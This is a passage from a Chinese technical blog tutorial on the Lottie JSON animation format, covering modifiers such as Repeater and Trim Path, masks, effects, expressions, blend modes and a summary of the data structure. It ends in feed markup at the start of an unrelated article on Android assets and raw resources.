  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"rp"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 类型：Repeater</span>
  <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Copies（副本数量）</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span> <span class="hljs-comment">// 生成5个副本（包含原始图形）</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Offset（副本索引偏移）</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span> <span class="hljs-comment">// 控制从哪个“虚拟副本”开始渲染，可用于动画</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"m"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// Composite（合成模式）：1=Above（后续副本在上方），2=Below（后续副本在下方）</span>
  <span class="hljs-attr">"tr"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Transform（每个副本的增量变换）</span>
    <span class="hljs-attr">"p"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">20</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 位置增量：每个副本右移20px</span>
    <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">90</span><span class="hljs-punctuation">,</span> <span class="hljs-number">90</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 缩放增量：每个副本缩小至90%</span>
    <span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">30</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span> <span class="hljs-comment">// 旋转增量：每个副本旋转30度</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>c</code> (Copies)</strong> ：生成的副本总数（包含原始图形）。</li>
<li><strong><code>o</code> (Offset)</strong> ：控制从哪个“虚拟副本”开始渲染，可用于动画。</li>
<li><strong><code>m</code> (Composite)</strong> ：控制副本的堆叠顺序。<code>1</code> 表示新副本叠在上方，<code>2</code> 表示新副本叠在下方。</li>
<li><strong><code>tr</code> (Transform)</strong> ：定义每个新副本相对于前一个副本的<strong>变换增量</strong>，是创造规律性变化的关键。</li>
</ul>
<h3 data-id="heading-43"><strong>其他修改器简介</strong></h3>
<p>除了上述两个，Lottie 还提供了其他实用的修改器来扩展图形能力：</p>























<table><thead><tr><th>类型标识 (<code>ty</code>)</th><th>名称</th><th>核心作用</th><th>关键属性与备注</th></tr></thead><tbody><tr><td><strong><code>rd</code></strong></td><td><strong>Round Corners</strong> (圆角)</td><td>将路径的所有尖角转换为指定半径的圆角。</td><td><code>r</code>：圆角半径。</td></tr><tr><td><strong><code>mm</code></strong></td><td><strong>Merge Paths</strong> (合并路径)</td><td>将多个路径合并为一个（类似布尔运算）。</td><td><code>mm</code>：合并模式（如相加、相减、交集等）。 ⚠️ <strong>注意</strong>：官方文档标注此功能<strong>目前不被支持</strong>，使用时需谨慎测试。</td></tr></tbody></table>
<h3 data-id="heading-44">🎨小试牛刀：loading动画</h3>
<p>让我们将学到的 <code>Trim Path</code> 知识应用到实践中，制作一个经典的 loading 动画。下面的示例将展示如何通过动画 <code>o</code>（偏移）属性来创建持续旋转的圆环进度效果。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e06b64b3e4dd48d5a36702fdcf93bca5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=98ongG8AtZhZAutA0JARGRteDZE%3D" alt="录屏2026-01-08 17.48.53.gif" width="50%" loading="lazy"/></p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-string">"v"</span>: <span class="hljs-string">"5.7.4"</span>,
  <span class="hljs-string">"fr"</span>: <span class="hljs-number">30</span>,
  <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,
  <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,
  <span class="hljs-string">"w"</span>: <span class="hljs-number">800</span>,
  <span class="hljs-string">"h"</span>: <span class="hljs-number">600</span>,
  <span class="hljs-string">"nm"</span>: <span class="hljs-string">"Trim Path演示"</span>,
  <span class="hljs-string">"layers"</span>: [
    {
      <span class="hljs-string">"ty"</span>: <span class="hljs-number">4</span>,
      <span class="hljs-string">"nm"</span>: <span class="hljs-string">"圆形绘制动画"</span>,
      <span class="hljs-string">"ind"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-string">"ks"</span>: {
        <span class="hljs-string">"p"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">400</span>, <span class="hljs-number">300</span>, <span class="hljs-number">0</span>] }
      },
      <span class="hljs-string">"shapes"</span>: [
        {
          <span class="hljs-string">"ty"</span>: <span class="hljs-string">"gr"</span>,
          <span class="hljs-string">"nm"</span>: <span class="hljs-string">"圆形组"</span>,
          <span class="hljs-string">"it"</span>: [
            <span class="hljs-comment">// 1. 圆形路径</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"el"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"圆形路径"</span>,
              <span class="hljs-string">"p"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] },
              <span class="hljs-string">"s"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">200</span>, <span class="hljs-number">200</span>] }
            },
            <span class="hljs-comment">// 2. 描边样式</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"st"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"描边"</span>,
              <span class="hljs-string">"c"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">0.2</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>] },
              <span class="hljs-string">"w"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: <span class="hljs-number">12</span> },
              <span class="hljs-string">"lc"</span>: <span class="hljs-number">2</span>,
              <span class="hljs-string">"lj"</span>: <span class="hljs-number">2</span>
            },
            <span class="hljs-comment">// 3. Trim Path 修改器 ⭐️</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"tm"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"Trim Path"</span>,
              <span class="hljs-string">"s"</span>: {  <span class="hljs-comment">// 起点百分比 (0-100)</span>
                <span class="hljs-string">"a"</span>: <span class="hljs-number">1</span>,
                <span class="hljs-string">"k"</span>: [
                  { <span class="hljs-string">"t"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"s"</span>: [<span class="hljs-number">0</span>], <span class="hljs-string">"e"</span>: [<span class="hljs-number">100</span>] },
                  { <span class="hljs-string">"t"</span>: <span class="hljs-number">90</span>, <span class="hljs-string">"s"</span>: [<span class="hljs-number">100</span>] }
                ]
              },
              <span class="hljs-string">"e"</span>: {  <span class="hljs-comment">// 终点百分比 (0-100)</span>
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">"k"</span>: <span class="hljs-number">100</span>
              },
              <span class="hljs-string">"o"</span>: {  <span class="hljs-comment">// 偏移角度 (0-360)</span>
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">"k"</span>: <span class="hljs-number">0</span>
              }
            },
            <span class="hljs-comment">// 4. 组变换</span>
            { <span class="hljs-string">"ty"</span>: <span class="hljs-string">"tr"</span> }
          ]
        }
      ]
    }
  ]
}
</code></pre>
<hr/>
<h2 data-id="heading-45"><strong>八、高级特性 - 蒙版、效果、表达式</strong></h2>
<p>本章将简要介绍 Lottie 中几个高级但常用的特性。理解这些概念有助于您阅读和分析更复杂的动画文件，但在实际创作中，请注意它们在不同平台和渲染器中的支持程度可能有所差异。</p>
<h3 data-id="heading-46"><strong>蒙版（Mask）：<code>masksProperties</code> 数组</strong></h3>
<p>蒙版用于控制图层的显示区域，实现剪切、遮罩等效果。在图层对象中，通过 <code>masksProperties</code> 数组定义。</p>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"masksProperties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"mode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"a"</span><span class="hljs-punctuation">,</span>           <span class="hljs-comment">// 蒙版模式：a=相加，s=相减，i=相交等</span>
    <span class="hljs-attr">"pt"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>                <span class="hljs-comment">// 路径（Path），定义蒙版形状</span>
      <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">,</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">,</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 不透明度（Opacity）</span>
    <span class="hljs-attr">"inv"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-comment">// 是否反转（Inverted）</span>
    <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"蒙版1"</span>                <span class="hljs-comment">// 名称（Name）</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<p><strong>关键属性：</strong></p>
<ul>
<li>
<p><strong><code>mode</code></strong>：蒙版混合模式。除了常用的 <code>"a"</code>（Add，相加）和 <code>"s"</code>（Subtract，相减），Lottie Schema 还定义了其他模式，但并非所有都被完全支持。</p>













































<table><thead><tr><th>模式代码</th><th>名称 (英文)</th><th>作用效果</th></tr></thead><tbody><tr><td><code>"n"</code></td><td>None (无)</td><td>禁用蒙版</td></tr><tr><td><code>"a"</code></td><td>Add (相加)</td><td>合并多个蒙版区域</td></tr><tr><td><code>"s"</code></td><td>Subtract (相减)</td><td>从现有区域中减去</td></tr><tr><td><code>"i"</code></td><td>Intersect (相交)</td><td>只保留蒙版重叠区域</td></tr><tr><td><code>"l"</code></td><td>Lighten (变亮)</td><td>保留较亮区域</td></tr><tr><td><code>"d"</code></td><td>Darken (变暗)</td><td>保留较暗区域</td></tr><tr><td><code>"f"</code></td><td>Difference (差异)</td><td>显示颜色差异区域</td></tr></tbody></table>
</li>
<li>
<p><strong><code>pt</code></strong>：蒙版路径，其数据结构（含 <code>v</code>, <code>i</code>, <code>o</code>）与形状图层中的自由路径（<code>sh</code>）完全相同。</p>
</li>
<li>
<p><strong><code>o</code></strong>：蒙版的不透明度。</p>
</li>
<li>
<p><strong><code>inv</code></strong>：布尔值，为 <code>true</code> 时反转蒙版区域。</p>
</li>
</ul>
<h3 data-id="heading-47"><strong>效果（Effects）：<code>ef</code> 数组</strong></h3>
<p>Lottie 支持部分 After Effects 内置效果，通过图层的 <code>ef</code> 数组定义。<strong>请注意，支持的效果非常有限，且并非所有AE效果都能被完美支持或渲染。</strong></p>
<p>根据官方 Schema 文档，有明确定义的效果类型包括：</p>
<ul>
<li><strong>填充</strong> (Fill): <code>ty: 21</code></li>
<li><strong>描边</strong> (Stroke): <code>ty: 22</code></li>
<li><strong>色调</strong> (Tint): <code>ty: 20</code></li>
<li><strong>三色调/专业色阶</strong> (Tritone/Pro Levels): <code>ty: 23</code></li>
</ul>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"ef"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">21</span><span class="hljs-punctuation">,</span>                 <span class="hljs-comment">// 效果类型：21 = 填充 (Fill)</span>
  <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"颜色叠加"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"en"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>                  <span class="hljs-comment">// 启用 (Enabled)</span>
  <span class="hljs-attr">"ef"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"颜色"</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span> <span class="hljs-comment">// 红色</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
</code></pre>
<blockquote>
<p><strong>重要说明</strong>：“高斯模糊 (<code>ty: 29</code>)”和“发光 (<code>ty: 27</code>)”等效果在公开的官方 Schema 文档中<strong>未有明确定义</strong>。它们可能由 Bodymovin 插件导出，但<strong>不一定被所有 Lottie 渲染器支持</strong>，在实际使用前必须进行充分的兼容性测试。</p>
</blockquote>
<h3 data-id="heading-48"><strong>表达式（Expression）：<code>x</code> 字段</strong></h3>
<p>表达式是 After Effects 中用于创建属性间动态关联的脚本语言。在 Lottie 中，表达式可以存储在属性的 <code>x</code> 字段中。</p>
<p>json</p>
<pre><code class="hljs language-css" lang="css">"<span class="hljs-selector-tag">p</span>": {
  "<span class="hljs-selector-tag">a</span>": <span class="hljs-number">1</span>,
  <span class="hljs-string">"k"</span>: [{"t":<span class="hljs-number">0</span>, <span class="hljs-string">"s"</span>:[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]}, {"t":<span class="hljs-number">30</span>, <span class="hljs-string">"s"</span>:[<span class="hljs-number">100</span>,<span class="hljs-number">100</span>]}],
  "x": <span class="hljs-string">"loopOut('cycle')"</span>  // 表达式：循环播放动画
}
</code></pre>
<p><strong>表达式的作用与局限性</strong>：</p>
<ul>
<li><strong>作用</strong>：可以创建循环 (<code>loopOut</code>)、随机 (<code>wiggle</code>)、数学关联等复杂动画逻辑，无需大量关键帧。</li>
<li><strong>局限性</strong>：<strong>平台支持极不完整</strong>。仅有少数最基础的表达式可能在部分平台上被识别，复杂的表达式通常会被忽略或导致动画错误。在需要跨平台稳定播放的动画中，应尽量避免使用表达式。</li>
</ul>
<h3 data-id="heading-49"><strong>混合模式（Blend Mode）：<code>bm</code> 字段</strong></h3>
<p>混合模式控制当前图层如何与下层图层进行颜色混合。在图层（根对象）或形状样式元素（如 <code>fl</code>, <code>st</code>）中通过 <code>bm</code> 字段定义。</p>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"bm"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span>  <span class="hljs-comment">// 叠加模式 (Overlay)</span>
</code></pre>
<p><strong>混合模式值速查表</strong> (根据官方 <code>/helpers/blendMode.json</code>)：</p>



























































<table><thead><tr><th>值</th><th>模式 (英文)</th><th>值</th><th>模式 (英文)</th></tr></thead><tbody><tr><td>0</td><td>Normal (正常)</td><td>8</td><td>Hard Light (强光)</td></tr><tr><td>1</td><td>Multiply (相乘)</td><td>9</td><td>Soft Light (柔光)</td></tr><tr><td>2</td><td>Screen (屏幕)</td><td>10</td><td>Difference (差值)</td></tr><tr><td>3</td><td>Overlay (叠加)</td><td>11</td><td>Exclusion (排除)</td></tr><tr><td>4</td><td>Darken (变暗)</td><td>12</td><td>Hue (色相)</td></tr><tr><td>5</td><td>Lighten (变亮)</td><td>13</td><td>Saturation (饱和度)</td></tr><tr><td>6</td><td>Color Dodge (颜色减淡)</td><td>14</td><td>Color (颜色)</td></tr><tr><td>7</td><td>Color Burn (颜色加深)</td><td>15</td><td>Luminosity (明度)</td></tr></tbody></table>
<p><strong>注意</strong>：混合模式在 SVG/HTML 渲染器中支持较好，在其他渲染器（如 Canvas）或某些移动端平台中可能需要降级处理或不被支持。</p>
<hr/>
<h2 data-id="heading-50"><strong>九、结语</strong></h2>
<p>本文系统性地解析了 Lottie JSON 的核心数据结构。以下是全文知识要点的回顾与总结：</p>
<h3 data-id="heading-51"><strong>核心数据结构总览</strong></h3>































































































<table><thead><tr><th>模块</th><th>关键对象/字段</th><th>核心作用与要点</th></tr></thead><tbody><tr><td><strong>顶层结构</strong></td><td><code>v</code>, <code>fr</code>, <code>ip</code>, <code>op</code>, <code>w</code>, <code>h</code></td><td>定义动画全局信息：版本、帧率、时间轴、画布尺寸。</td></tr><tr><td/><td><code>assets</code>, <code>layers</code>, <code>chars</code></td><td>三大数据支柱：可复用资源、图层序列、矢量字形。</td></tr><tr><td><strong>图层系统</strong></td><td><code>ty</code> (0-5)</td><td>标识六种图层类型：预合成、纯色、图像、空对象、形状、文本。</td></tr><tr><td/><td><code>ind</code>, <code>parent</code>, <code>ip</code>, <code>op</code>, <code>st</code></td><td>控制图层索引、父子关系、时间属性（入点、出点、起始时间）。</td></tr><tr><td/><td><code>ks</code></td><td><strong>变换属性容器</strong>，包含锚点(<code>a</code>)、位置(<code>p</code>)、缩放(<code>s</code>)、旋转(<code>r</code>)、透明度(<code>o</code>)等。</td></tr><tr><td><strong>动画系统</strong></td><td><code>ks</code> 下的 <code>a</code> 字段</td><td>属性动画开关：<code>0</code>为静态值，<code>1</code>为动画值（关键帧数组）。</td></tr><tr><td/><td>关键帧 <code>k</code> 数组</td><td>定义动画轨迹，包含时间(<code>t</code>)、值(<code>s</code>/<code>e</code>)、缓动(<code>i</code>/<code>o</code>)。</td></tr><tr><td><strong>形状系统</strong></td><td><code>shapes</code> 数组</td><td>形状图层的<strong>核心容器</strong>，元素按索引顺序渲染叠加。</td></tr><tr><td/><td><code>ty: el/rc/sr/sh</code></td><td>基础图形：椭圆、矩形、星形、自由路径（贝塞尔曲线定义）。</td></tr><tr><td/><td><code>ty: gr</code> (组)</td><td>使用 <code>it</code> 数组组织子元素，实现层级管理与统一变换。</td></tr><tr><td><strong>样式系统</strong></td><td><code>ty: fl</code> (填充)</td><td>定义形状填充色（纯色或渐变）。</td></tr><tr><td/><td><code>ty: st</code> (描边)</td><td>定义轮廓线样式，包括线宽(<code>w</code>)、端点(<code>lc</code>)、连接(<code>lj</code>)。</td></tr><tr><td><strong>修改器</strong></td><td><code>ty: tm</code> (Trim)</td><td>路径裁剪，通过动画起点(<code>s</code>)、终点(<code>e</code>)、偏移(<code>o</code>)实现绘制效果。</td></tr><tr><td/><td><code>ty: rp</code> (Repeater)</td><td>图形重复器，通过副本数(<code>c</code>)和增量变换(<code>tr</code>)创建阵列。</td></tr><tr><td><strong>高级特性</strong></td><td><code>masksProperties</code></td><td>蒙版数组，通过路径(<code>pt</code>)和模式(<code>mode</code>)控制图层显示区域。</td></tr><tr><td/><td><code>ef</code> (效果), <code>bm</code> (混合模式)</td><td>实现滤镜与图层混合，<strong>需注意平台支持度</strong>。</td></tr><tr><td/><td><code>x</code> (表达式)</td><td>支持简单表达式驱动属性，<strong>跨平台支持有限</strong>。</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-52"><strong>十、写在最后：笔者的思考</strong>💡</h2>
<p>在整理 Lottie 的技术细节时，我反复思考一个核心问题：<strong>我们看到的这套 JSON 结构，到底是由什么决定的？</strong></p>
<p>最直接的答案是“为了在网页上播放”。但这只是目的，并未解释其形态。我的思路分两步推进：第一，是 Web 的渲染能力（如 Canvas）限制了它的设计；第二，是否有更底层的蓝本在主导结构。</p>
<p>通过逐项对比，我找到了更关键的依据。<strong>Lottie JSON 的结构，本质上是对 After Effects 内部动画数据模型的直接翻译。</strong>  例如，JSON 中的 <code>ks</code> 对象精确对应了 AE 图层的“变换”属性组，<code>shapes</code> 数组则完全复现了 AE 形状层的堆叠逻辑。设计者的首要任务，是为 AE 的动画状态提供一个<strong>无损且精确的数据描述格式</strong>。</p>
<p>那么，Web 技术（如 Canvas/SVG）的作用是什么？我认为它主要扮演了  <strong>“支持度评估”与“性能优化”的角色</strong>。它并未改变数据描述的根本方式，而是基于实现难度与性能成本，划定了哪些 AE 高级功能可以（或不可以）被包含在这个格式中。例如，一些复杂的实时滤镜可能因性能考量而被排除。</p>
<p>这自然引向更深一层：<strong>AE 自身的这套强大模型又是如何建立的？</strong>  它并非凭空创造，而是对更早行业的数字化融合。其“合成”与“图层”概念源自<strong>电影工业</strong>的胶片叠加流程；“关键帧”动画继承自<strong>传统手绘动画</strong>的生产方式；而所有视觉变换的根基，则是<strong>计算机图形学</strong>提供的数学工具（如坐标变换、贝塞尔曲线）。</p>
<p>因此，学习 Lottie 最有效的方法，并非孤立记忆 JSON 字段，而是<strong>理解它作为“AE 模型的数据接口”这一定位</strong>。掌握 AE 的核心概念，就能理解 Lottie 绝大部分的设计逻辑。这揭示了一种高效的学习路径：当面对一个出色的“技术转译层”时，直接研究它所转译的<strong>源系统</strong>，往往是理解其设计最快的方式。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android 的 assets 资源和 raw 资源有什么区别？]]></title>    <link>https://juejin.cn/post/7594626381433094194</link>    <guid>https://juejin.cn/post/7594626381433094194</guid>    <pubDate>2026-01-13T09:59:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594626381433094194" data-draft-id="7584349458857181210" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android 的 assets 资源和 raw 资源有什么区别？"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-13T09:59:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Vic_wkx"/> <meta itemprop="url" content="https://juejin.cn/user/1116759545357182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android 的 assets 资源和 raw 资源有什么区别？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1116759545357182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Vic_wkx
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T09:59:13.000Z" title="Tue Jan 13 2026 09:59:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    62
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body 